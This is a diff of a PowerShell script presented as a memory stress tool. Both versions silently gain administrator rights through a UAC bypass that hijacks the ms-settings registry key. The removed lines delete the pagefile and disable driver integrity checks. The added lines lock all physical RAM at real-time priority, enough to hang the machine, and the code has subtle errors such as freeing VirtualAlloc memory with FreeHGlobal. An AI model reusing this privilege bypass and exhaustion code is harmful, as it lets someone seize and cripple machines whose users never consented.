@@ -1,4 +1,4 @@
-# Self-elevate silently via UAC bypass
+# Self-elevate via UAC bypass (unchanged)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
     $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
@@ -13,98 +13,83 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# --- Pagefile Removal with Force ---
-Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
-Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
-Invoke-Expression "bcdedit /set useplatformclock true"
-Invoke-Expression "bcdedit /set disabledynamictick yes"
-Invoke-Expression "bcdedit /set nointegritychecks yes"
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
-Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public static class MemLock {
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, 
+        uint flAllocationType, uint flProtect);
+}
+"@
 
-Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
-Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
-Import-Module ThreadJob -Force
+# --- System Configuration ---
+$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
+$targetSize = $physicalMem  # 100% of physical RAM
+$chunkSize = 2MB  # Optimal allocation size
+$lockInterval = 500MB  # Lock every 500MB allocated
 
-# --- Memory Allocation Parameters ---
-$physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
-$targetMem = [math]::Floor($physicalMem * 1)  # 98% of RAM
-$minChunkSize = 4GB
-$maxChunkSize = 15GB
-$increaseChunkSize = 1GB  # Large page size
-$jobs = [System.Collections.ArrayList]::new()
+# --- Memory Stress Core Function ---
+function Invoke-MemoryStress {
+    $totalLocked = 0
+    $lockedBlocks = [System.Collections.Generic.List[IntPtr]]::new()
 
-# --- Kernel-Level Memory Allocation Function ---
-$memHogScript = {
-    param(
-        [int64]$minChunkSize,
-        [int64]$maxChunkSize,
-        [int64]$increaseChunkSize,
-        [int64]$targetSize
-    )
-
-    $allocated = 0
-    $memChunks = [System.Collections.Generic.List[byte[]]]::new()
-    $chunkSize = $minChunkSize
-
-    Write-Host "Starting memory hog script"
     try {
-        while ($allocated -lt $targetSize) {
-            Write-Host "Attempting to allocate $chunkSize bytes"
-            if ($chunkSize -lt $maxChunkSize) {
-                $chunkSize = $chunkSize + $increaseChunkSize
-                Write-Host "Increased chunk size: $chunkSize"
+        while ($totalLocked -lt $targetSize) {
+            $alloc = [MemLock]::VirtualAlloc(
+                [IntPtr]::Zero,
+                [UIntPtr][uint64]$chunkSize,
+                0x1000,  # MEM_COMMIT
+                0x04     # PAGE_READWRITE
+            )
+            
+            if ($alloc -eq [IntPtr]::Zero) {
+                throw "VirtualAlloc failed"
             }
-            try {
-                $chunk = New-Object byte[] $chunkSize
-                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
-                $memChunks.Add($chunk)
-                $allocated += $chunkSize
-                Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
-            } catch {
-                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
-                return  # Exit job if allocation fails
+
+            if (-not [MemLock]::VirtualLock($alloc, [UIntPtr][uint64]$chunkSize)) {
+                throw "VirtualLock failed"
             }
-            Start-Sleep -Milliseconds 500
+
+            $lockedBlocks.Add($alloc)
+            $totalLocked += $chunkSize
+            
+            if ($totalLocked % $lockInterval -eq 0) {
+                Write-Host "Locked $(($totalLocked/1MB)) MB"
+            }
         }
-    } catch {
-        Write-Error "An error occurred in memory hog script: $_"
+        
+        Write-Host "Memory pressure stabilized at $($totalLocked/1GB) GB"
+        while ($true) { Start-Sleep -Seconds 60 }
     }
-
-    # Keep $memChunks alive to prevent GC
-    while ($true) { Start-Sleep -Seconds 10 }
-}
-
-function Start-StressJob {
-    param($index)
-    $job = Start-Job -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
-    $job | Add-Member -NotePropertyName Retries -NotePropertyValue 0
-    $jobs.Add($job)
-}
-
-# Start stress jobs for each CPU core
-1..([Environment]::ProcessorCount) | ForEach-Object {
-    Start-StressJob -index $i
-}
-
-$jobs | ForEach-Object {
-    Write-Host "Job $($_.Id) state: $($_.State)"
-}
-
-# --- Monitoring with Minimal CPU Impact ---
-while ($true) {
-    $currentJobs = @($jobs.ToArray())
-    $currentJobs | ForEach-Object {
-        if ($_.State -ne 'Running') {
-            Write-Host "ThreadJob is not running as expected: $($job.State)"
-        }
-        if ($_.Retries -lt 3 -and $_.State -ne 'Running') {
-            $newJob = Start-ThreadJob -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
-            $newJob | Add-Member -NotePropertyName Retries -NotePropertyValue ($_.Retries + 1)
-            $jobs.Remove($_)
-            $jobs.Add($newJob)
+    finally {
+        foreach ($block in $lockedBlocks) {
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($block)
         }
     }
-    Start-Sleep -Seconds 30  # Reduced monitoring frequency
 }
+
+# --- Process Priority Configuration ---
+try {
+    $proc = Get-Process -Id $PID
+    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
+    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest
+    [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::SustainedLowLatency
+}
+catch {
+    Write-Warning "Priority elevation failed: $_"
+}
+
+# --- Launch Stress Workers ---
+$threadCount = [Environment]::ProcessorCount
+$jobs = @()
+
+1..$threadCount | ForEach-Object {
+    $jobs += Start-ThreadJob -ScriptBlock ${function:Invoke-MemoryStress} -ThrottleLimit 100
+}
+
+Write-Host "Started $threadCount memory stress workers"
+$jobs | Wait-Job | Out-Null
